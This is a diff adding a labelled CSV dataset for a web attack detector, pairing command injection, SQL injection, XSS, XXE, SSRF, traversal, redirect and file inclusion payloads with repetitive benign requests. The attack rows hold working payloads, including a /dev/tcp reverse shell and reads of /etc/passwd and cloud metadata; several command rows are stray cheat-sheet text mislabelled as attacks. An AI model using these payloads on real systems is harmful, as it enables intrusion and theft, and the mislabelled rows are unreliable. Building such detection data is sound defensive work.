@@ -1,0 +1,328 @@
+attack_type,payload,request,encoded_request,label
+command,;whoami,GET /ping?ip=;whoami,GET /ping?ip=%3Bwhoami,1
+command,&& whoami,GET /ping?ip=&& whoami,GET /ping?ip=&& whoami,1
+command,| whoami,GET /ping?ip=| whoami,GET /ping?ip=%7C whoami,1
+command,$(whoami),GET /ping?ip=$(whoami),GET /ping?ip=%24%28whoami%29,1
+command,`whoami`,GET /ping?ip=`whoami`,GET /ping?ip=%60whoami%60,1
+command,; sleep 5,GET /ping?ip=; sleep 5,GET /ping?ip=%3B sleep 5,1
+command,; ls,GET /ping?ip=; ls,GET /ping?ip=%3B ls,1
+command,cat /etc/passwd,GET /ping?ip=cat /etc/passwd,GET /ping?ip=cat /etc/passwd,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,daemon:x:1:1:daemon:/usr/sbin:/bin/sh,GET /ping?ip=daemon:x:1:1:daemon:/usr/sbin:/bin/sh,GET /ping?ip=daemon:x:1:1:daemon:/usr/sbin:/bin/sh,1
+command,bin:x:2:2:bin:/bin:/bin/sh,GET /ping?ip=bin:x:2:2:bin:/bin:/bin/sh,GET /ping?ip=bin:x:2:2:bin:/bin:/bin/sh,1
+command,sys:x:3:3:sys:/dev:/bin/sh,GET /ping?ip=sys:x:3:3:sys:/dev:/bin/sh,GET /ping?ip=sys:x:3:3:sys:/dev:/bin/sh,1
+command,...,GET /ping?ip=...,GET /ping?ip=...,1
+command,command1; command2   # Execute command1 and then command2,GET /ping?ip=command1; command2   # Execute command1 and then command2,GET /ping?ip=command1%3B command2   %23 Execute command1 and then command2,1
+command,command1 && command2 # Execute command2 only if command1 succeeds,GET /ping?ip=command1 && command2 # Execute command2 only if command1 succeeds,GET /ping?ip=command1 && command2 %23 Execute command2 only if command1 succeeds,1
+command,command1 || command2 # Execute command2 only if command1 fails,GET /ping?ip=command1 || command2 # Execute command2 only if command1 fails,GET /ping?ip=command1 %7C%7C command2 %23 Execute command2 only if command1 fails,1
+command,command1 & command2  # Execute command1 in the background,GET /ping?ip=command1 & command2  # Execute command1 in the background,GET /ping?ip=command1 & command2  %23 Execute command1 in the background,1
+command,command1 | command2  # Pipe the output of command1 into command2,GET /ping?ip=command1 | command2  # Pipe the output of command1 into command2,GET /ping?ip=command1 %7C command2  %23 Pipe the output of command1 into command2,1
+command,cat${IFS}/etc/passwd,GET /ping?ip=cat${IFS}/etc/passwd,GET /ping?ip=cat%24%7BIFS%7D/etc/passwd,1
+command,ls${IFS}-la,GET /ping?ip=ls${IFS}-la,GET /ping?ip=ls%24%7BIFS%7D-la,1
+command,"{cat,/etc/passwd}","GET /ping?ip={cat,/etc/passwd}",GET /ping?ip=%7Bcat%2C/etc/passwd%7D,1
+command,cat</etc/passwd,GET /ping?ip=cat</etc/passwd,GET /ping?ip=cat%3C/etc/passwd,1
+command,sh</dev/tcp/127.0.0.1/4242,GET /ping?ip=sh</dev/tcp/127.0.0.1/4242,GET /ping?ip=sh%3C/dev/tcp/127.0.0.1/4242,1
+command,"ping%CommonProgramFiles:~10,-18%127.0.0.1","GET /ping?ip=ping%CommonProgramFiles:~10,-18%127.0.0.1",GET /ping?ip=ping%25CommonProgramFiles:~10%2C-18%25127.0.0.1,1
+command,"ping%PROGRAMFILES:~10,-5%127.0.0.1","GET /ping?ip=ping%PROGRAMFILES:~10,-5%127.0.0.1",GET /ping?ip=ping%25PROGRAMFILES:~10%2C-5%25127.0.0.1,1
+command,$ cat /et\,GET /ping?ip=$ cat /et\,GET /ping?ip=%24 cat /et%5C,1
+command,c/pa\,GET /ping?ip=c/pa\,GET /ping?ip=c/pa%5C,1
+command,sswd,GET /ping?ip=sswd,GET /ping?ip=sswd,1
+command,cat%20/et%5C%0Ac/pa%5C%0Asswd,GET /ping?ip=cat%20/et%5C%0Ac/pa%5C%0Asswd,GET /ping?ip=cat%2520/et%255C%250Ac/pa%255C%250Asswd,1
+command,"{,ip,a}","GET /ping?ip={,ip,a}",GET /ping?ip=%7B%2Cip%2Ca%7D,1
+command,"{,ifconfig}","GET /ping?ip={,ifconfig}",GET /ping?ip=%7B%2Cifconfig%7D,1
+command,"{,ifconfig,eth0}","GET /ping?ip={,ifconfig,eth0}",GET /ping?ip=%7B%2Cifconfig%2Ceth0%7D,1
+command,"{l,-lh}s","GET /ping?ip={l,-lh}s",GET /ping?ip=%7Bl%2C-lh%7Ds,1
+command,"{,echo,#test}","GET /ping?ip={,echo,#test}",GET /ping?ip=%7B%2Cecho%2C%23test%7D,1
+command,"{,$""whoami"",}","GET /ping?ip={,$""whoami"",}",GET /ping?ip=%7B%2C%24%22whoami%22%2C%7D,1
+command,"{,/?s?/?i?/c?t,/e??/p??s??,}","GET /ping?ip={,/?s?/?i?/c?t,/e??/p??s??,}",GET /ping?ip=%7B%2C/?s?/?i?/c?t%2C/e??/p??s??%2C%7D,1
+command,swissky@crashlab:~$ echo ${HOME:0:1},GET /ping?ip=swissky@crashlab:~$ echo ${HOME:0:1},GET /ping?ip=swissky%40crashlab:~%24 echo %24%7BHOME:0:1%7D,1
+command,/,GET /ping?ip=/,GET /ping?ip=/,1
+command,swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd,GET /ping?ip=swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd,GET /ping?ip=swissky%40crashlab:~%24 cat %24%7BHOME:0:1%7Detc%24%7BHOME:0:1%7Dpasswd,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,"swissky@crashlab:~$ echo . | tr '!-0' '""-1'","GET /ping?ip=swissky@crashlab:~$ echo . | tr '!-0' '""-1'",GET /ping?ip=swissky%40crashlab:~%24 echo . %7C tr %27%21-0%27 %27%22-1%27,1
+command,/,GET /ping?ip=/,GET /ping?ip=/,1
+command,"swissky@crashlab:~$ tr '!-0' '""-1' <<< .","GET /ping?ip=swissky@crashlab:~$ tr '!-0' '""-1' <<< .",GET /ping?ip=swissky%40crashlab:~%24 tr %27%21-0%27 %27%22-1%27 %3C%3C%3C .,1
+command,/,GET /ping?ip=/,GET /ping?ip=/,1
+command,"swissky@crashlab:~$ cat $(echo . | tr '!-0' '""-1')etc$(echo . | tr '!-0' '""-1')passwd","GET /ping?ip=swissky@crashlab:~$ cat $(echo . | tr '!-0' '""-1')etc$(echo . | tr '!-0' '""-1')passwd",GET /ping?ip=swissky%40crashlab:~%24 cat %24%28echo . %7C tr %27%21-0%27 %27%22-1%27%29etc%24%28echo . %7C tr %27%21-0%27 %27%22-1%27%29passwd,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,"swissky@crashlab:~$ echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""","GET /ping?ip=swissky@crashlab:~$ echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""",GET /ping?ip=swissky%40crashlab:~%24 echo -e %22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22,1
+command,/etc/passwd,GET /ping?ip=/etc/passwd,GET /ping?ip=/etc/passwd,1
+command,"swissky@crashlab:~$ cat `echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`","GET /ping?ip=swissky@crashlab:~$ cat `echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",GET /ping?ip=swissky%40crashlab:~%24 cat %60echo -e %22%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc,GET /ping?ip=swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc,GET /ping?ip=swissky%40crashlab:~%24 abc=%24%27%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%27%3Bcat %24abc,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`,GET /ping?ip=swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`,GET /ping?ip=swissky%40crashlab:~%24 %60echo %24%27cat%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%27%60,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764,GET /ping?ip=swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764,GET /ping?ip=swissky%40crashlab:~%24 xxd -r -p %3C%3C%3C 2f6574632f706173737764,1
+command,/etc/passwd,GET /ping?ip=/etc/passwd,GET /ping?ip=/etc/passwd,1
+command,swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`,GET /ping?ip=swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`,GET /ping?ip=swissky%40crashlab:~%24 cat %60xxd -r -p %3C%3C%3C 2f6574632f706173737764%60,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764),GET /ping?ip=swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764),GET /ping?ip=swissky%40crashlab:~%24 xxd -r -ps %3C%28echo 2f6574632f706173737764%29,1
+command,/etc/passwd,GET /ping?ip=/etc/passwd,GET /ping?ip=/etc/passwd,1
+command,swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`,GET /ping?ip=swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`,GET /ping?ip=swissky%40crashlab:~%24 cat %60xxd -r -ps %3C%28echo 2f6574632f706173737764%29%60,1
+command,root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,GET /ping?ip=root:x:0:0:root:/root:/bin/bash,1
+command,w'h'o'am'i,GET /ping?ip=w'h'o'am'i,GET /ping?ip=w%27h%27o%27am%27i,1
+command,wh''oami,GET /ping?ip=wh''oami,GET /ping?ip=wh%27%27oami,1
+command,'w'hoami,GET /ping?ip='w'hoami,GET /ping?ip=%27w%27hoami,1
+command,"w""h""o""am""i","GET /ping?ip=w""h""o""am""i",GET /ping?ip=w%22h%22o%22am%22i,1
+command,"wh""""oami","GET /ping?ip=wh""""oami",GET /ping?ip=wh%22%22oami,1
+command,"""wh""oami","GET /ping?ip=""wh""oami",GET /ping?ip=%22wh%22oami,1
+command,w\ho\am\i,GET /ping?ip=w\ho\am\i,GET /ping?ip=w%5Cho%5Cam%5Ci,1
+command,/\b\i\n/////s\h,GET /ping?ip=/\b\i\n/////s\h,GET /ping?ip=/%5Cb%5Ci%5Cn/////s%5Ch,1
+command,who$()ami,GET /ping?ip=who$()ami,GET /ping?ip=who%24%28%29ami,1
+command,who$(echo am)i,GET /ping?ip=who$(echo am)i,GET /ping?ip=who%24%28echo am%29i,1
+command,who`echo am`i,GET /ping?ip=who`echo am`i,GET /ping?ip=who%60echo am%60i,1
+command,/???/??t /???/p??s??,GET /ping?ip=/???/??t /???/p??s??,GET /ping?ip=/???/??t /???/p??s??,1
+command,test=/ehhh/hmtc/pahhh/hmsswd,GET /ping?ip=test=/ehhh/hmtc/pahhh/hmsswd,GET /ping?ip=test=/ehhh/hmtc/pahhh/hmsswd,1
+command,cat ${test//hhh\/hm/},GET /ping?ip=cat ${test//hhh\/hm/},GET /ping?ip=cat %24%7Btest//hhh%5C/hm/%7D,1
+command,cat ${test//hh??hm/},GET /ping?ip=cat ${test//hh??hm/},GET /ping?ip=cat %24%7Btest//hh??hm/%7D,1
+command,"Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}","GET /ping?ip=Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",GET /ping?ip=Payload: 1%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%27%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%22%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D,1
+command,# Context inside commands with single and double quote:,GET /ping?ip=# Context inside commands with single and double quote:,GET /ping?ip=%23 Context inside commands with single and double quote:,1
+command,"echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}","GET /ping?ip=echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",GET /ping?ip=echo 1%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%27%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%22%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D,1
+command,"echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}","GET /ping?ip=echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",GET /ping?ip=echo %271%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%27%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%22%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D,1
+command,"echo ""1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}","GET /ping?ip=echo ""1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",GET /ping?ip=echo %221%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%27%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D%22%3Bsleep%24%7BIFS%7D9%3B%23%24%7BIFS%7D,1
+command,"Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/","GET /ping?ip=Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",GET /ping?ip=Payload: /%2A%24%28sleep 5%29%60sleep 5%60%60%2A/-sleep%285%29-%27/%2A%24%28sleep 5%29%60sleep 5%60 %23%2A/-sleep%285%29%7C%7C%27%22%7C%7Csleep%285%29%7C%7C%22/%2A%60%2A/,1
+command,# Context inside commands with single and double quote:,GET /ping?ip=# Context inside commands with single and double quote:,GET /ping?ip=%23 Context inside commands with single and double quote:,1
+command,"echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/","GET /ping?ip=echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",GET /ping?ip=echo 1/%2A%24%28sleep 5%29%60sleep 5%60%60%2A/-sleep%285%29-%27/%2A%24%28sleep 5%29%60sleep 5%60 %23%2A/-sleep%285%29%7C%7C%27%22%7C%7Csleep%285%29%7C%7C%22/%2A%60%2A/,1
+command,"echo ""YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/""","GET /ping?ip=echo ""YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/""",GET /ping?ip=echo %22YOURCMD/%2A%24%28sleep 5%29%60sleep 5%60%60%2A/-sleep%285%29-%27/%2A%24%28sleep 5%29%60sleep 5%60 %23%2A/-sleep%285%29%7C%7C%27%22%7C%7Csleep%285%29%7C%7C%22/%2A%60%2A/%22,1
+command,"echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/'","GET /ping?ip=echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/'",GET /ping?ip=echo %27YOURCMD/%2A%24%28sleep 5%29%60sleep 5%60%60%2A/-sleep%285%29-%27/%2A%24%28sleep 5%29%60sleep 5%60 %23%2A/-sleep%285%29%7C%7C%27%22%7C%7Csleep%285%29%7C%7C%22/%2A%60%2A/%27,1
+file_inclusion,/etc/passwd,GET /index.php?page=/etc/passwd,GET /index.php?page=/etc/passwd,1
+file_inclusion,../../../etc/passwd,GET /index.php?page=../../../etc/passwd,GET /index.php?page=../../../etc/passwd,1
+file_inclusion,file:///etc/passwd,GET /index.php?page=file:///etc/passwd,GET /index.php?page=file:///etc/passwd,1
+file_inclusion,C:\Windows\win.ini,GET /index.php?page=C:\Windows\win.ini,GET /index.php?page=C:%5CWindows%5Cwin.ini,1
+file_inclusion,http://example.com/shell.txt,GET /index.php?page=http://example.com/shell.txt,GET /index.php?page=http://example.com/shell.txt,1
+redirect,http://evil.com,GET /redirect?url=http://evil.com,GET /redirect?url=http://evil.com,1
+redirect,https://evil.com,GET /redirect?url=https://evil.com,GET /redirect?url=https://evil.com,1
+redirect,//evil.com,GET /redirect?url=//evil.com,GET /redirect?url=//evil.com,1
+redirect,///evil.com,GET /redirect?url=///evil.com,GET /redirect?url=///evil.com,1
+redirect,https://attacker.com,GET /redirect?url=https://attacker.com,GET /redirect?url=https://attacker.com,1
+sqli,' OR 1=1 --,POST /login BODY:username=admin&password=' OR 1=1 --,POST /login BODY:username=admin&password=%27 OR 1=1 --,1
+sqli,' OR '1'='1,POST /login BODY:username=admin&password=' OR '1'='1,POST /login BODY:username=admin&password=%27 OR %271%27=%271,1
+sqli,UNION SELECT NULL,POST /login BODY:username=admin&password=UNION SELECT NULL,POST /login BODY:username=admin&password=UNION SELECT NULL,1
+sqli,"UNION SELECT username,password","POST /login BODY:username=admin&password=UNION SELECT username,password",POST /login BODY:username=admin&password=UNION SELECT username%2Cpassword,1
+sqli,SLEEP(5),POST /login BODY:username=admin&password=SLEEP(5),POST /login BODY:username=admin&password=SLEEP%285%29,1
+sqli,1 OR 1=1,POST /login BODY:username=admin&password=1 OR 1=1,POST /login BODY:username=admin&password=1 OR 1=1,1
+sqli,admin'--,POST /login BODY:username=admin&password=admin'--,POST /login BODY:username=admin&password=admin%27--,1
+ssrf,http://127.0.0.1,POST /fetch BODY:url=http://127.0.0.1,POST /fetch BODY:url=http://127.0.0.1,1
+ssrf,http://localhost,POST /fetch BODY:url=http://localhost,POST /fetch BODY:url=http://localhost,1
+ssrf,http://0.0.0.0,POST /fetch BODY:url=http://0.0.0.0,POST /fetch BODY:url=http://0.0.0.0,1
+ssrf,http://192.168.1.1,POST /fetch BODY:url=http://192.168.1.1,POST /fetch BODY:url=http://192.168.1.1,1
+ssrf,http://10.0.0.1,POST /fetch BODY:url=http://10.0.0.1,POST /fetch BODY:url=http://10.0.0.1,1
+ssrf,http://169.254.169.254/latest/meta-data/,POST /fetch BODY:url=http://169.254.169.254/latest/meta-data/,POST /fetch BODY:url=http://169.254.169.254/latest/meta-data/,1
+ssrf,file:///etc/passwd,POST /fetch BODY:url=file:///etc/passwd,POST /fetch BODY:url=file:///etc/passwd,1
+ssrf,gopher://127.0.0.1,POST /fetch BODY:url=gopher://127.0.0.1,POST /fetch BODY:url=gopher://127.0.0.1,1
+traversal,../,GET /download?file=../,GET /download?file=../,1
+traversal,../../,GET /download?file=../../,GET /download?file=../../,1
+traversal,../../../,GET /download?file=../../../,GET /download?file=../../../,1
+traversal,../../../../etc/passwd,GET /download?file=../../../../etc/passwd,GET /download?file=../../../../etc/passwd,1
+traversal,..%2f,GET /download?file=..%2f,GET /download?file=..%252f,1
+traversal,%2e%2e%2f,GET /download?file=%2e%2e%2f,GET /download?file=%252e%252e%252f,1
+traversal,..\,GET /download?file=..\,GET /download?file=..%5C,1
+xss,<script>alert(1)</script>,GET /search?q=<script>alert(1)</script>,GET /search?q=%3Cscript%3Ealert%281%29%3C/script%3E,1
+xss,<img src=x onerror=alert(1)>,GET /search?q=<img src=x onerror=alert(1)>,GET /search?q=%3Cimg src=x onerror=alert%281%29%3E,1
+xss,javascript:alert(1),GET /search?q=javascript:alert(1),GET /search?q=javascript:alert%281%29,1
+xss,"""><script>alert(1)</script>","GET /search?q=""><script>alert(1)</script>",GET /search?q=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,1
+xss,<svg/onload=alert(1)>,GET /search?q=<svg/onload=alert(1)>,GET /search?q=%3Csvg/onload=alert%281%29%3E,1
+xxe,"<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>","POST /xml BODY:xml=<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]>",POST /xml BODY:xml=%3C%21DOCTYPE foo %5B %3C%21ENTITY xxe SYSTEM %22file:///etc/passwd%22%3E %5D%3E,1
+xxe,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">","POST /xml BODY:xml=<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",POST /xml BODY:xml=%3C%21ENTITY xxe SYSTEM %22file:///etc/passwd%22%3E,1
+xxe,"<!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]>","POST /xml BODY:xml=<!DOCTYPE root [<!ENTITY test SYSTEM ""file:///etc/passwd"">]>",POST /xml BODY:xml=%3C%21DOCTYPE root %5B%3C%21ENTITY test SYSTEM %22file:///etc/passwd%22%3E%5D%3E,1
+benign,,GET /contact?id=10,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /home?page=home,,0
+benign,,GET /home?id=10,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /?user=admin,,0
+benign,,GET /products?id=10,,0
+benign,,GET /?id=10,,0
+benign,,GET /home?page=home,,0
+benign,,GET /about?user=admin,,0
+benign,,GET /?user=admin,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /products?page=home,,0
+benign,,GET /products?user=admin,,0
+benign,,GET /login?id=10,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /login?search=laptop,,0
+benign,,GET /home?page=home,,0
+benign,,GET /login?id=10,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /login?user=admin,,0
+benign,,GET /login?id=10,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /about?id=10,,0
+benign,,GET /products?id=10,,0
+benign,,GET /about?search=laptop,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /login?user=admin,,0
+benign,,GET /home?id=10,,0
+benign,,GET /?page=home,,0
+benign,,GET /login?id=10,,0
+benign,,GET /home?id=10,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /login?page=home,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /contact?id=10,,0
+benign,,GET /about?page=home,,0
+benign,,GET /about?page=home,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /?page=home,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /?page=home,,0
+benign,,GET /about?search=laptop,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /products?category=electronics,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /home?page=home,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /about?search=laptop,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /products?user=admin,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /home?page=home,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /?id=10,,0
+benign,,GET /?page=home,,0
+benign,,GET /contact?page=home,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /about?id=10,,0
+benign,,GET /products?category=electronics,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /about?search=laptop,,0
+benign,,GET /about?id=10,,0
+benign,,GET /contact?id=10,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /login?search=laptop,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /products?page=home,,0
+benign,,GET /products?id=10,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /about?page=home,,0
+benign,,GET /about?id=10,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /about?page=home,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /about?id=10,,0
+benign,,GET /about?search=laptop,,0
+benign,,GET /products?id=10,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /login?page=home,,0
+benign,,GET /?page=home,,0
+benign,,GET /about?id=10,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /?user=admin,,0
+benign,,GET /home?page=home,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /about?page=home,,0
+benign,,GET /login?user=admin,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /contact?page=home,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /products?user=admin,,0
+benign,,GET /products?id=10,,0
+benign,,GET /home?page=home,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /?user=admin,,0
+benign,,GET /about?page=home,,0
+benign,,GET /about?page=home,,0
+benign,,GET /?id=10,,0
+benign,,GET /contact?id=10,,0
+benign,,GET /home?id=10,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /?user=admin,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /products?page=home,,0
+benign,,GET /?id=10,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /login?category=electronics,,0
+benign,,GET /products?category=electronics,,0
+benign,,GET /contact?id=10,,0
+benign,,GET /contact?id=10,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /?page=home,,0
+benign,,GET /home?page=home,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /products?page=home,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /about?id=10,,0
+benign,,GET /?user=admin,,0
+benign,,GET /?id=10,,0
+benign,,GET /home?page=home,,0
+benign,,GET /products?category=electronics,,0
+benign,,GET /products?page=home,,0
+benign,,GET /products?id=10,,0
+benign,,GET /home?category=electronics,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /login?category=electronics,,0
+benign,,GET /login?category=electronics,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /contact?category=electronics,,0
+benign,,GET /home?page=home,,0
+benign,,GET /login?page=home,,0
+benign,,GET /?user=admin,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /?search=laptop,,0
+benign,,GET /?id=10,,0
+benign,,GET /about?category=electronics,,0
+benign,,GET /about?user=admin,,0
+benign,,GET /home?id=10,,0
+benign,,GET /about?id=10,,0
+benign,,GET /home?id=10,,0
+benign,,GET /about?id=10,,0
+benign,,GET /contact?page=home,,0
+benign,,GET /products?id=10,,0
+benign,,GET /about?page=home,,0
+benign,,GET /about?user=admin,,0
+benign,,GET /?user=admin,,0
+benign,,GET /?category=electronics,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /about?user=admin,,0
+benign,,GET /login?search=laptop,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /products?page=home,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /products?search=laptop,,0
+benign,,GET /?id=10,,0
+benign,,GET /products?user=admin,,0
+benign,,GET /about?id=10,,0
+benign,,GET /?user=admin,,0
+benign,,GET /home?user=admin,,0
+benign,,GET /login?page=home,,0
+benign,,GET /login?id=10,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /login?page=home,,0
+benign,,GET /products?user=admin,,0
+benign,,GET /contact?search=laptop,,0
+benign,,GET /about?user=admin,,0
+benign,,GET /?user=admin,,0
+benign,,GET /login?id=10,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /?id=10,,0
+benign,,GET /contact?user=admin,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /login?user=admin,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /home?search=laptop,,0
+benign,,GET /about?category=electronics,,0
